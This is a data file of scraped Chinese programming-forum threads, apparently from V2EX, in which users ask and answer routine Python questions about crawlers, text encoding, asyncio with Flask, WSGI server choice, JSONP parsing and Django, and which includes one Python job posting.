{"content": ["<div class=\"topic_content\">用 python 写了一个爬虫，就是简单的网页抓取，在运行一天左右后就自己停了，没有出错信息。在 google 一番后看到某个人说因为调试输出过多（也就是 print 函数）导致缓冲区溢出，所以意外停止。问一下大家有可能是这个问题吗？看大家写了那么多爬虫一直 print 也没有这种情况啊。</div>"], "reply": "8", "tittle": "使用 Python 写了爬虫，总是因为未知原因意外停止", "comment": ["流程里多打几次 log 就能看出问题了", "不要 print,用 logging 模块", "把所有 print 注释掉再跑一遍不就知道是不是了。。", "我给你说一个可能的原因。。我当初是碰到 这种情况了。。当时我的爬虫，爬到了有人分享的 Android 开发工具包。。好几个 G 的文件。。爬虫没做判断，自己在那里下载，崩掉了。 。你做做 log ，然后多考虑特殊情况。捕捉 Exception", "放弃 print ， 学习一下怎么用 log 吧，设计良好的 log 比用完就删的 print 有用得多。", "谢谢大家都回答，目前已经删除 print 输出调试，正在测试是不是这方面的问题，也准备从 print 转向 log", "如果是这个原因的话，你把内容 print 到哪儿去了？", "logstash 非常好用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我在网上采集的新闻，先存在本地数据库中，然后再传到自己的网站上，前面都正常，为什么传到网站上就是乱码呢？在采集的网站是正常的，在数据库中是正常的，我从数据库中手工复制然后手工输入到网站后台的输入信息模块，显示也是正常的。唯独用 python 自动登陆从本地数据库中读取信息再自动上传到网站上时是乱码。\n我的系统是 WinXp ， python34 ，数据库 access ，网站用 utf-8 编码</p>\n</div></div>"], "reply": "10", "tittle": "在本地正常的内容，为什么上传到网站上就成了乱码？", "comment": ["网站上的中文也都正常，就只是网站数据库中的内容是乱码", "提示： xp 系统的默认编码不是 utf8", " 感觉和 XP 系统没关系，因为不需要在本地输出", "仅凭这些信息，估计没人能帮到你。", "代码里处理字串，代码里连接数据库时，数据库数据表的编码\r", "\r", "这 3 个地方都要 UTF-8 才会保证不乱码。", "同意 5 楼。你可以在程序读取数据库数据那部分做个打印，看看数据有没有变化。", " \r", " \r", "现在暂时解决了，在上传时每个字段加个 encode('gbk')就不是乱码，现在搞的我很奇怪，为什么是 gbk ？怎么可能呢！", " 这说明你的页面编码是 gbk 。\r", "<meta charset=utf-8>\r", "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r", "这样设置应该就 ok 了", " \r", "网页代码里有<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> 啊，就是按这个来做的。", " XP 系统默认就是 gbk\r", "\r", "中文内容信息，每一步都输出编码信息"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我想实现的一个需求是这样的，我写一个 http 服务端（正在用 Flask ），接到一个用户浏览器发来的 request 之后，同时向多个上游服务器发送 request ，哪个上游服务器的 response 最快就拿谁的结果，把处理一下响应给用户浏览器。\n有点类似 HTTP proxy ，只不过是多个上游服务器。由于需要同时向多个上游服务器发请求，我尝试了用 asyncio+aiohttp 。\n可是这用在 Flask 里面应该怎么用啊？\n难道我要在每个 route 里面写 loop.run_until_complete 吗？</p>\n<pre><code>app = Flask(__name__)\nloop = asyncio.get_event_loop()\n\n@app.route(\"/list1/\")\ndef filelist1():\n\tasync def get_file_list1():\n    \tawait dosomething1()\n\tloop.run_until_complete(get_file_list1())\n\n\n@app.route(\"/list2/\")\ndef filelist2():\n\tasync def get_file_list2():\n    \tawait dosomething2()\n\tloop.run_until_complete(get_file_list2())\n</code></pre>\n<p>另外有一个 <a href=\"https://github.com/Hardtack/Flask-aiohttp\" rel=\"nofollow\">https://github.com/Hardtack/Flask-aiohttp</a> ，不知道有没有用，不知道这个插件解决了什么问题。。还是说要用tornado？也不知道tornado解决了什么问题。。</p>\n</div></div>", "<div class=\"topic_content\">同时向多个上游服务器发送请求，收到其中的一个 response 之后，就把其它的 IO cancel 掉。用 asyncio 的好处是可以 cancel 掉 IO 。\r<br>之前曾经试过用多线程+requests ，但这种做法，当一个请求发出之后，还没收到 response 之前，线程就会被阻塞住，没法取消掉。于是了解了异步 IO ，随时可以 cancel 。</div>", "<div class=\"topic_content\">非常感谢 @<a target=\"_blank\" href=\"/member/youyongsong\">youyongsong</a> 耐心的分析。\r<br>我看完后的理解是， tornado 用一个 loop 来处理所有接收到的 http 请求，如果服务器收到非常频繁而密集的请求，这种模型是很高效的。\r<br>\r<br>而我的使用场景，并不是频繁接收请求，而是频繁发出请求。如果我也用传统方式，每接收到一个请求后， fork 出一个进程 /线程来处理该请求，同时在该进程 /线程中建立一个 loop ，并用这个 loop 来管理频繁发出的请求，是否可行？突然想到，如果所有进程 /线程都共用一个 loop 的话，会产生线程安全问题。</div>", "<div class=\"topic_content\">还有一点就是，使用协成，出现异常调试起来麻烦一点</div>"], "reply": "21", "tittle": "最近用 Python 的 asyncio，有好多不懂。。", "comment": ["u need tornado", " 原因是什么。。 tornado 解决了什么问题？", "你可以试看看 sanic 。", " 大概是指异步", " 我知道 tornado 跟异步有关。那么我在 Flask+uwsgi 里面用异步又有什么不一样呢？我想搞清楚。", " 另外， gevent 用在 flask 上又扮演什么角色呢？", "你可以看看 ", " 里面有很多对 asyncio 和 sanic 的内容。强烈关注作者的微信公众号", " @", " 谢谢，感觉 sanic 很棒。", "感觉，好像要用异步的话，所有的库都要换成异步了。。还有，异步有异常的话不好调试。", "从不同的上游服务器拿到的 response 相同吗？还是要再处理后返回给浏览器？", " 不同的，要经过处理后再返回。", "这个问题涉及的东西比较多 你要了解：\r", "\r", "1. 基于 epoll 等实现的 event loop \r", "2. 然后在此基础上理解类似 nodejs 的基于回调函数的异步处理\r", "3. 然后再了解 python 的 cotoutine 如何基于生成器实现的\r", "4. 然后理解 Python 的 Future 和 js 的 Promise 等如何解决基于回调的异步带来的回调嵌套问题\r", "5. 最后 async await 只是一个生成器协程的语法糖\r", "\r", "对比下 gevent, nodejs tornado asyncio golang erlang 和 线程模型，然后你就全都明白了。", " cotoutine -> coroutine", "\r", "大概是需要回调", "说下我对这 python 这几种 web 模型的理解吧：\r", "\r", "首先是 http server + wsgi server(container) + wsgi application 这种传统模型吧：    \r", "http server 指的是类似于 nginx 或 apache 的服务    \r", "wsgi server 指的是类似 gunicorn 和 uwsgi 这样的服务    \r", "wsgi application 指的是 flask django 这样的基于 wsgi 接口的框架运行起来的实例    \r", "最初这种模型只是为了方便 web 框架的开发者，不需要每个框架层面都去实现一遍 http server ，就增加了一个 WSGI 中间层协议，框架只要实现这个协议的客户端就可以，然后用 wsgi server 去实现 http 协议的解析并去调用客户端(wsgi application)。     \r", "\r", "为了方便开发，每个框架都内置了一个简易的 wsgi server ，为什么还要用专门的 wsgi server 呢？    \r", "wsgi 除了解析 http 协议以及 http 端口侦听外，还负责了流量转发以及 wsgi application 进程管理的功能。一般 wsgi 框架内置的 wsgi server 都是一个单进程，一次只能处理一个请求。而目的通用的 wsgi server(gunicorn, uwsgi)都至少支持 pre fork 模型，这种模型会起一个 master 来侦听请求，并启动多个 slave(每个 slave 是一个 wsgi application)， master 负责把请求转发到空闲的 slave 上。除了这种传统的基于进程的 pre fork 同步模型，不同的 wsgi server 也会支持一些其它模型，有基于线程的同步模型，也有基于 asyncio 的异步模型。\r", "\r", "这种模型下怎样写异步代码呢？       \r", "1. 直接用传统的异步编程(进程，线程，协程)，虽然有些 wsgi server 支持 asynio 模型，但是这也需要用户所写的代码做相应的支持。这就导致了如果我们在 wsgi application 的时候不能随便使用线程和异步 IO ，如果用了就需要配置 wsgi server 使其支持我们自己的写法。因此为了使得我们缩写的 application 能部署在任意的 wsgi server(container)中，我们就只能写同步代码了。       \r", "2. 使用分布式异步编程，使用类似 celery 的方式，将需要异步处理的东西发送到 worker 去处理。         \r", "\r", "既然有了 wsgi server ，为什么还要有一个 http server 呢？    \r", "主要是因为 wsgi server 支持的并发量比较低，一般会用一个专门的 http server 来做一层缓冲，避免并发量过大时直接服务挂掉。     \r", "\r", "\r", "python 传统的这种 wsgi 模型，主要是为了方便框架开发者只需要专注框架层面，而非 http 处理层面。但这样却增加了服务部署的复杂度，需要同时部署和配置 http server 和 wsgi server ，如果想支持异步还要部署 worker ，而使用 tornado 或 go 开发的应用因为自己实现了高效 http 处理的应用只需要部署自己就可以了。      \r", "\r", "\r", "接下来是 tornado 和 twisted 这种模型：      \r", "这种模型和上面的传统模型处于一个时期，这种模型和 nodejs 差不多，都是基于回调的模型，适用于高 IO 低 CPU 的场景。这种模型自己实现了一个基于回调 http server(event loop)，每一个请求都被注册成一个异步函数来处理，然后主循环来不断的循环这些函数。这样就和 pre fork 模型有了区别， pre fork 模型中每一个 slave 都是一个 wsgi application ，一个 wsgi application 都只能处理一个请求，而回调模型只有一个线程，不仅极大的减少了内存的分配还减小了进城以及线程间的切换开销，从而可以支持高 IO 并发。但是这种模型也有很明显的缺点，就是一旦应用程序有大量的 CPU 计算，就会让这个线程堵住，所有的请求都会收到影响，如果应用在处理一个请求时崩溃，所有的请求也都会收到影响。    \r", "\r", "\r", "接下来时 aiohttp/sanic 这种模型：\r", "这种模型和 tornada 模型的改进，但实质上是一样的，因为回调的写法不易读也容易出错，于是将回调的写法改成了同步的写法。这种模型和 koa2 和 go net/http 查不多， asyncio 提供了类似 go coroutine 的功能和写法，而 aiohttp 则提供了类似 go 中的 net/http 的 http 处理库。", "怎么说呢......Flask 是个 web 框架,但是并不是一个 webserver,这也就是你的前面还要加 nginx/unicorn 的原因(当然一般还会有 uwsgi)......简单但是不准确的来说 flask 只负责处理请求,而不负责收发请求......\r", "而楼上提到的 tornado 有 web 框架,也有 webserver.\r", "另外,楼主这个应该使用负载均衡更好一点吧,这种竞争式的其实一般来说效率反而底下.", " 好久没有见过那么仔细地分析的了。", " nginx flask uwsgi 的关系我理解。只是关于 tornado 的东西还不理解", " 厉害呀。理解这么透彻。服。虽然我看不懂。但是感觉很厉害。", "asyncio 可以看 ", " 我这里很早以前糙译了一下 ", " 末尾有惊喜..", " 我把 flask 换成了 sanic ，然后发现 aiohttp 也可以构建异步 http 的服务端"]},
{"content": ["<div class=\"topic_content\">大家好，最近用 django 做一个项目，遇到点问题，向大家请教下，情况是这样的。 web 页面上有个文本框，用户输入 python 代码，页面上有运行按钮，点击后保存到服务器端执行，然后将结果取回显示，目前能实现程序运行完成后整个结果取回显示，问题是，当运行的python代码运行时间比较长时，需要显示当前实时的运行结果到界面，不知道各位有什么好的思路没有，谢谢大家~~</div>"], "reply": "1", "tittle": "请教一个 Django 的问题", "comment": ["有点像 jupyter notebook 啊"]},
{"content": ["<div class=\"topic_content\">我们是谁？\r<br>极致、激情、创新，我们是充满活力的 ELEMAN,梦想打造全球第一的即时配送平台\r<br>\r<br>我们需要这样的你：\r<br>\r<br>\r<br>工作内容：\r<br>\r<br>1.负责物流应用的架构设计，应用开发，带领团队攻克难题，解决问题；\r<br>\r<br>2.负责分析业务领域比较复杂的问题，根据业务需求选择技术解决方案。\r<br>\r<br>任职要求：\r<br>\r<br>1.1 年以上相关工作经验，至少 1 年以上 Python 编程经验，使用 Python 开发过大型系统；\r<br>\r<br>2.精通 Python 语言，熟悉 Python 多线程应用开发，熟悉 flask 、 tornado 、 django 等开发框架；\r<br>\r<br>3.熟悉 Redis 、 RabbitMQ 等；\r<br>\r<br>4.熟悉 TCP/IP 网络协议,熟悉 Linux 操作系统;\r<br>\r<br>5.熟悉 XML 、 JSON 、 SOAP 协议；\r<br>\r<br>6.需对 Nginx 、 Apache 、 Tomcat 、 MySQL 等有一定的开发及维护经验；\r<br>\r<br>7.强烈的责任心，能够帮助团队其他成员成长，良好的沟通表达能力和团队合作精神;\r<br>\r<br>8.懂大数据，机器学习，有数学建模经验的优先。\r<br>\r<br>你能获得什么？\r<br>极具挑战工作内容，不断突破的技术天花板，还有诗和远方 We are one ；\r<br>丰厚报酬 15K-30K/月没有最高只有更高，年终封顶 6 个月；\r<br>餐补、加班餐、生日 /节假日礼物&amp;活动、年度体检，帮你解决后顾之忧；\r<br>一年一度 Hackthon ，弹性上班时间，硅谷办公空间；\r<br>\r<br>小伙伴快到碗里来，投递邮箱： <a target=\"_blank\" href=\"mailto:chen.chen03@ele.me\">chen.chen03@ele.me</a>\r<br>\r<br>附上本猿匆匆拍摄的照片：\r<br>\r<br>饿了么富有特色的大火锅：\r<br><a target=\"_blank\" href=\"http://i.imgur.com/ACJRSMK.png\"><img src=\"http://i.imgur.com/ACJRSMK.png\" class=\"embedded_image\"></a><br>\r<br>个性的办公区：\r<br><a target=\"_blank\" href=\"http://i.imgur.com/T4M2nLL.jpg\"><img src=\"http://i.imgur.com/T4M2nLL.jpg\" class=\"embedded_image\"></a></div>"], "reply": "8", "tittle": "饿了么大物流离线业务组 Python 招聘啦~~（帮 HR 代发[微笑]）", "comment": ["工作地上海。", "公司个人邮箱这样命名，不能忍", "HR 是个美女，是不是？", "这是你们 5 楼吗", "这才是你们 5 楼~~", "上面的才是 5 楼", "楼上的真是 5 楼？", " HR 是美女快撩起来~ 手动滑稽~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>给测试部的同事培训 Python 基础，我把这句列在语言特点中了，讲到这里的时候脑子突然闪过字符串赋值单双引号，大脑瞬间尴尬后直接讲\"任何事物都有打脸的一面，比如字符串赋值...\"囧</p>\n</div></div>"], "reply": "4", "tittle": "如何机智的解释\"there is only one way to do it\"?", "comment": ["字符串引号是可以活用的。\r", "\r", "one best way to do it, called pythonic way", " 如何活法，明明是单双引号通用么， python3 默认字符串双引号会转为单引号\r", "不过嵌套用的时候则按照定义顺序来，是否就是活在这了...手动滑稽", "never say never!", "只有一种最好的做法。\r", "至于哪种是最好的做法，可以吵几年。"]},
{"content": ["<div class=\"topic_content\">曾经在配置文件里设置了超时限制， CELERYD_TASK_SOFT_TIME_LIMIT ，本来在 Linux 下是能用的。\r<br>\r<br>当然，这里插一句，也曾经设置过 CELERY_TASK_RESULT_EXPIRES 和 CELERYD_TASK_TIME_LIMIT ，不过没起作用。\r<br>\r<br>后来因为某些原因，程序迁移到了 windows 下，结果发现报错如下：\r<br>UserWarning: Soft timeouts are not supported: on this platform: It does not have the SIGUSR1 signal.&amp;*\r<br>\r<br>查了下文档：\r<br><a target=\"_blank\" href=\"http://docs.celeryproject.org/en/latest/userguide/workers.html#time-limits\" rel=\"nofollow\">http://docs.celeryproject.org/en/latest/userguide/workers.html#time-limits</a>\r<br>发现：\r<br>\"Time limits do not currently work on Windows and other platforms that do not support the SIGUSR1 signal.\"\r<br>\r<br>另外看了下，在 @<a target=\"_blank\" href=\"/member/app\">app</a>.task()这样的形式，去在括号里添加 timeout 和 time limit 之类的内容，据说也是不行的。\r<br>\r<br>那么问题来了，难道 windows 下 celery 无法设置超时么？如果必须在 win 下运行的话，有其他解决办法么？</div>"], "reply": "目前尚无回", "tittle": "关于 celery 在 windows 下不能进行 time limit（超时限制）的解决办法", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>python 版本： 2.7\n本人能力：非程序员，有一点点喜欢 python ，想折腾一些数据采集之类的，以便今后转运营助理或者运营，方便数据记录、分析。\n环境模拟：想要采集皮鞋第一页、第二页全部产品的标题、图片、价格等前端展现的内容，可能详情页也需要用代码做截图处理，可能需要采集正文和评价。\n问题：淘宝里的 json 是非正常的，由于技术问题，先用 sub 替换了 jsonp232()，也不能正常解析。求前辈折腾一下。</p>\n</blockquote>\n<p>json 地址：\n<a href=\"https://s.taobao.com/api?_ksTS=1489731701469_231&amp;callback=jsonp232&amp;ajax=true&amp;m=customized&amp;rn=2e8936bb027bece89209046885ec042a&amp;q=%E7%9A%AE%E9%9E%8B&amp;imgfile=&amp;js=1&amp;stats_click=search_radio_all%3A1&amp;initiative_id=staobaoz_20170317&amp;ie=utf8&amp;s=36&amp;bcoffset=-3\" rel=\"nofollow\">https://s.taobao.com/api?_ksTS=1489731701469_231&amp;callback=jsonp232&amp;ajax=true&amp;m=customized&amp;rn=2e8936bb027bece89209046885ec042a&amp;q=%E7%9A%AE%E9%9E%8B&amp;imgfile=&amp;js=1&amp;stats_click=search_radio_all%3A1&amp;initiative_id=staobaoz_20170317&amp;ie=utf8&amp;s=36&amp;bcoffset=-3</a></p>\n<p>python 不用处理就能正常 dumps 、 load 能解析的\n<img alt=\"普通 json\" src=\"http://wx3.sinaimg.cn/mw1024/005BYsWNgy1fdpuk5u2s4j3113091gmj.jpg\">\n淘宝 json\n<img alt=\"淘宝 json\" src=\"http://wx2.sinaimg.cn/mw1024/005BYsWNgy1fdpuka1wkhj31050l0gnn.jpg\"></p>\n</div></div>"], "reply": "8", "tittle": "Python 非常规 json 如何解析_淘宝 json", "comment": ["这个是 JSONP 的，不光是最前面有额外字符，最后面也有字符", "ls +1\r", "地址里的 callback=jsonp232 直接改为 callback= 不就是 json 了", "谢谢上面两个大神 我测试一下", "JSONP", "  \r", "\r", "\r", "这样就是 json 了", "楼主 你发的那个是 jsonp\r", "\r", "这个删除即可&callback=jsonp232\r", "\r", "不一一答谢了，各位层主谢谢，搞定了。", " js=1 我觉得也要删"]},
{"content": ["<div class=\"topic_content\">部分代码： \r<br>\r<br>   post_data = {\"gameId\": 1,\r<br>                 \"activityType\": 2,\r<br>                 \"title\": \"炉石常规 17 日 14:30\",\r<br>                 \"activity_rule_id\": 3,\r<br>                 \"activity_people\": 1,\r<br>                 \"model\": \"common\",\r<br>                 #timerule 是出问题的地方\r<br>                 \"timerule\": \"['2017-03-18 15:11', '2017-03-18 15:21', '2017-03-18 15:31', '2017-03-18 15:41']\",\r<br>                 \"password\": 111111,\r<br>                 \"remark\": \"1111\",\r<br>                 \"frozen\": \"100\",\r<br>                 \"common_rewardrule\": \"{'1':'60','2':'30','3':'10'}\"}\r<br>\r<br>             request = requests.post(create_match_url, post_data, headers=headers)\r<br>\r<br>\r<br>post_data 中的 timerule ， php 后台要求是一个 array ，请问怎么转换呢？\r<br>我尝试过写成这样：\r<br>\"timerule\": ['2017-03-18 15:11', '2017-03-18 15:21', '2017-03-18 15:31', '2017-03-18 15:41']\r<br>但是仍然不行。\r<br>requests.Request 方法传递 json 是不是只能转换成 str 呢？</div>"], "reply": "1", "tittle": "requests.Request()方法怎么传一个 PHP 可以接收的数组对象呢？", "comment": ["这样其实是可以的，但是 php 需要先做 parse. 默认是 application/x-www-form-urlencoded 数据"]},
{"content": ["<div class=\"topic_content\">查了一圈。没有看到类似的。\r<br>虽然 VSCode 自动排序 import 很方便</div>"], "reply": "3", "tittle": "VSCode 里面有没有 Pycharm 中的『未使用的 import 会自动变灰色』的插件呀", "comment": ["那个应该是 lint 类的插件吧", "vscode 的 pylint 插件非常反人类，完全不知道它在提示啥，开了之后满屏的红色。", " 默认的那个叫 pylint 是吧，确实严格了点，我换成另外一个就没那么多错误提示了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>def api_register_user(*, email, name, passwd)\n</code></pre>\n<p>上面的*是什么意思，头一次见到，不平常都是*arg 和**kw 么，这个啥意思呢？没搞明白</p>\n</div></div>"], "reply": "2", "tittle": "问个关于函数参数的小问题", "comment": ["*后面的参数必须以关键字的形式传入。调用这个函数比如写 api_register_user(email=1, name=2, passwd=3)，而不能写 api_register_user(1, 2, 3)", " 感谢，懂了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>提示：<strong>前面的废话有点长，大家可以直接看黑体部分。</strong></p>\n<p>这个问题看起来很奇怪，我自己也奇怪怎么会有这种问题。。。但偏偏它却发生了。事情是这样的，前一段时间用 pyqt5 写了个客户端，想用 pyqtdeploy 编译一下，编译倒是成功了，但是无法运行。尝试了几次之后发现是 logging 模块的问题，替换了 logging 模块之后问题依旧。最关键的是 windows 下运行出错没有任何的提示，无法进一步找到根本原因。于是转战 linux ，编译之后仍然是无法运行，但是得益于 linux 的提示，终于让我找到了原因，原来是 time 模块的原因。 logging 模块引用了 time 模块，而 time 模块在编译的时候没有被包含进去，于是出现了 <code>ImportError: No module named 'time'</code> 的提示。但是我已经在 pyqtdeploy 界面上勾选了 time 模块，为什么还会出现这个错误呢。我注意到我自定义的那些模块都被成功包含进去了，于是我想到把 time 模块提取出来，当作自定义模块添加进去。</p>\n<p><strong>但是问题来了。。。 time 模块的文件路径是什么呢</strong> ？ python3 的目录里面是没有的，如果在交互模式下输入 time 的话 显示的是 <code>&lt;module 'time' (built-in)&gt;</code> ，大部分模块都会显示路径，它却没有显示。<strong>所以想在这里求助各位 V 友，如何把 time 模块提取出来？或者如何让 pyqtdeploy 把 time 模块包含进去 ？</strong></p>\n</div></div>", "<div class=\"topic_content\">@<a target=\"_blank\" href=\"/member/ryd994\">ryd994</a>\r<br>把用 pycharm 得到的 time.py 文件放入之后又遇到了新的问题，提示找不到 _socket.py ，放入 _socket.py 之后又有新的问题，感觉这是个无尽的坑啊。我似乎明白了，应该是 pyqtdeloy 编译的 python3 在启动的时候漏掉了什么语句，导致有些内置模块没有被加载。看来要研究一下 python3 加载内置模块的过程了。</div>"], "reply": "6", "tittle": "[深夜求助] 关于 time 模块的文件位置，各位 v 有谁知道的 ？", "comment": ["lib 里找不到...", "这个链接可能有帮助\r", "编辑器如果是 pycharm 的话， ctrl+鼠标去按一下 time 就可以找到源文件。\r", "如果不是用 pycharm 的话，一般就那几个文件夹，找找应该是有的", " \r", " \r", "\r", "找到了，就是在 built-in 文件，关键是 built-in 文件在哪呢。。我用 pycharm 可以得到 time 的源码，或许可以放进去试试 ？", "ipython ， time??, 查看源码", "这是 CPython 的 C 部分\r", "\r", "你的思路可能走偏了，不要提这种 A->B 的问题\r", "直接搜 pyqtdeploy time module\r", "粗略扫一下这篇可能对你有帮助 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在系统使用的是 nginx+uwsgi(开启 gevent)+bottle(gevent monkey patch)，测试场景(读 redis)， qps 4k 左右，请问还有性能更高、稳定的生产级别架构吗？谢谢！</p>\n</div></div>"], "reply": "18", "tittle": "Python WSGI servers 高性能选型", "comment": ["我用 flask ，一直配合 gunicorn 的 eventlet 选项使用。貌似没毛病。", "先测 redis 。", "mark  你的 nginx 多少个 worker? upstream? uwsgi 多少个 processes?", "Cherrypy 的 wsgi", "你都用 Bottle 了 可以看下这个\r", " 列举了好多 wsgi server", " nginx 16 worker,upstream 2, uwsgi 8 processes, gevent 800,没做优化，但是使用 node 来测试，性能要高出很多， 1w+ qps 。", "gunicorn+meinheld", " qps 能到多少？我们这个产品是 n 年前的了，想知道现在业界主流的玩法。", "性能 uwsgi 算是比较高的，但是我还是建议 gunicorn ，因为我们团队碰到一些问题：", "性能 uwsgi 算是比较高的，但是我还是建议 gunicorn ，因为我们团队碰到一些问题：\r", "使用 uwsgi ，通过 zmq 发消息会丢失；有时候使用 requests 抓取网页会卡死", "gunicorn+meinheld 我测试不稳定，会出现空白页面。我现在用的是 gunicorn+gevent", "如果要性能高，可以试试 sanic ，速度很惊艳", "大概就是这个水平，用 cache 吧", "redis 用了链接池没有？\r", "\r", "上次代码有错，连接池没有挂上。\r", "\r", "不管什么机器死活只有几千 qps 。\r", "\r", "改成连接池后上几 w 了。", "楼主可以试试 gunicorn+meinheld 并发很高", "  能具体描述下空白页怎么出现的吗，我用了一年多，好像没出现说白页的…", " 当时的情况：\r", "有几个 API 服务， flask 写的，用的是 uWSGI ，工作一直正常，但是加上日志后（用 zmq 转发），出现日志丢失的情况\r", "然后改用 gunicorn ，默认 worker class 是 sync ，测试正常\r", "由于性能偏低，改用 meinheld ，然后客户端有时会出现异常，输出日志发现 API 服务返回的是空白页（状态是 200 ）\r", "现在用 gunicorn+gevent ，未出现问题\r", "\r", "顺便说下， API 服务是在 docker 中运行的", " uwsgi 里用 zmq 需要 enable-threads 和 lazy-apps 。因为 zmq 会创建后台线程去做报文收发，操作系统的机制决定， fork 出来的子进程会丢失线程，导致新创建的 worker 进程没有 zmq 的线程，能正常工作就怪了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>soup=bs(html)<br>\nsoup.prettify(encoding=None, formatter='minimal')</p>\n<p>prettify()方法的第二个参数 formatter 到底有几个合法的取值呢?<br>\n我们只知道有 minimal,还有什么呢?我们都不知道.<br>\n怎么找到这些参数的值呢?<br>\n这是 python 最不好的一个地方,方法的说明里不写明白,使用者怎么寻找这些特定的取值呢?</p>\n</div></div>"], "reply": "4", "tittle": "怎么查看 Beautiful Soup 的 prettify(encoding, formatter=\"minimal\")第二个参数有哪些合法的取值?", "comment": ["这个锅 python 不背。。。开发者不写注释神仙也没办法啊", "哇，我怎么一看就在官方文档里看见了。\r", "\r", " 是的,一点一点查看文档,翻遍了,自然能找到.\r", "但通常使用者不是这样使用的.比如我使用 pycharm,\r", "通常我看到代码提示,但不知道具体参数什么意思,于是找到方法定义的地方,\r", "但还是没有 formatter 的具体内容,再找 pycharm 就无能为力了!\r", "我想问的是,不一点点的翻文档,怎么使用 pycharm 这样的工具就能方便的找到 formatter 的具体值有哪些?", " 把光标移到函数名的位置，按一下 ctrl+Q 看文档。没有的话就只能再去找官方文档了。"]},
{"content": ["<div class=\"topic_content\">def encoding(dm):                        \r<br>&gt;&gt;types = ['utf-8','utf-16','gb2312','gbk']   \r<br>&gt;&gt;for type in types:\r<br>&gt;&gt;&gt;&gt;try:\r<br>&gt;&gt;&gt;&gt;&gt;&gt;return dm.decode(type),type   \r<br>&gt;&gt;&gt;&gt;except:\r<br>&gt;&gt;&gt;&gt;&gt;&gt;pass\r<br>\r<br>htmlstr = urllib.request.urlopen(htmlstr).read()\r<br>htmlstr,htmltype = encoding(htmlstr)\r<br>\r<br>这是从网上找的代码，是先取到页面代码，然后用 encoding 判断代码的编码，是用试错法，从几个编码里挨个试，如果不能转换就换下一个，直到找到为止。我在执行完这一步就把页面代码存入数据库了，但是直接上传到自己的网站上时显示乱码，必须用 btstr = btstr.encode('gbk')转成 gbk 才能正确显示内容，我的网站是 utf-8 编码，系统是 xp ， python34 ， sublime3 ，数据库是 access ，步骤就是这样。\r<br>\r<br>我现在奇怪的是上面代码中 return dm.decode(type),type  这句到底起什么作用？\r<br>如果对方网站是 utf-8 编码，那么 dm.decode('utf-8')是解码成 unicode ？\r<br>把这个网页代码存入数据库时是什么编码？\r<br>为什么上传的时候必须要编码成 gbk 才能显示呢？</div>"], "reply": "12", "tittle": "关于编码的几个疑问，搞糊涂了。", "comment": ["网站编码的确是 utf-8 ，因为我在后台发布带有“•”字符的信息也能正常显示，但是用上传操作的时候用 bt = bt.encode('gbk')就会报错", "刚才从数据库里取出来字符串再做个测试，结果也是 utf-8 。", "首先明确两个概念：\r", "* 字符串(string)，在 Python 3 中是 'abc' 或 str()\r", "* 字节流(binary)，在 Python 3 中是 b'abc' 或 bytes()\r", "然后记清：\r", "* str.encode() -> bytes\r", "* bytes.decode() -> str\r", "\r", "urlopen().read() 返回 bytes\r", "你的 encoding 函数是通过 try 的方式找到正确的编码，然后 decode 成 str 同时返回对应编码名\r", "\r", "把 str 值存入数据库时，要看数据库对应字段数据类型，一般 driver 会自动处理。建议选择支持 Unicode 存储的数据类型。\r", "你可以在数据库里查看存储的字符串值对不对。\r", "\r", "最后就是从数据库里读出字符串在网站显示，一般网站框架会自动处理。", " 刚才从数据库里取出字符串用 encoding 做了个测试，全都是 utf-8 ，话说应该是 unicode 才对啊。\r", "既然数据库中的是 utf-8 ，那上传时不需要再转码啊", "全程 utf8 ，我用 py3 后就没出现过编码问题了。", "htmlstr, htmltype = encoding(htmlstr)\r", "这句执行完， type(htmlstr) 应该是 str\r", "你从数据库取出来后， type 是什么？\r", "\r", "另外你的 encoding 函数，如果 4 种情况都出错，会走 pass ，不 return 结果。", "识别字符编码可以考虑用 cchardet 。\r", "单机数据库选 sqlite 比 access 好，除非有特殊需要。", " 你从数据库取出来后， type 是什么？ \r", "这里的 type 就是 utf-8 ，数据库连接我用的 pypyodbc ，好像也没找到有需要设置编码的地方。", " 要改的话，整个系统都要改，太花时间了。", "py IO 显示是 unicode 吧", "存储是用 UTF-8 ，显示是根据你终端的编码来的吧\r", "decode 的参数是现在的类型，都是转成 unicode\r", "感觉最好还是用 py3 ， py2 编码太坑了", "这段代码有点意思， decode 函数怎么会知道你输入的字串的编码？ 如果这个字串的某些字符不再这个编码的范围内， decode 才会报错啊。 不同的 code page 都是可能有相同的编码的啊。换言之， 就算用了错误的 encoding type ， decode 函数还是有可能不会报错的， 只是得到的字符串并不是你期望得到的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>正在写一个类似 v2 的社区，在首页点击类似下面的标签时重新返回数据<br>\n技术  创意  好玩  Apple  酷工作  交易  城市<br>\n超链接地址例如是\"/?tab=2\"<br>\nurl 配置没有添加 url 参数，然后在视图里通过 get 获取 tab 参数，过滤数据，使用 render 返回渲染模板<br>\n现在主页点击这些标签时 url 地址会加上参数信息，请问如何隐藏？</p>\n</div></div>"], "reply": "9", "tittle": "django 如何隐藏 url 参数", "comment": ["一个页面或者 apache 静态？", "改用 post 就可以了。", "js 发起 get 请求并将数据渲染到当前页面  没有刷新页面,url 不变", "post 请求可以隐藏这些", "其实你还可以放在 session 里面,不过每次都要修改 session 很蛋疼", "谢谢各位的思路，其实我还想知道本站是怎么做的，就是首页“技术 创意”那个标签栏", "就是你这样的实现的呀！ V2EX 只是把首页和技术也映射到了同一个视图函数。", "/(?P<tab>\\d+)/\r", "\r", " 或者前面加一个 nginx 进行 rewrite", "我也是看了 V2EX 首页也改了下我的站，哈哈， url 里加参数我自定义的模板函数，还得替换 class 的 active ，我搞了一下午"]},
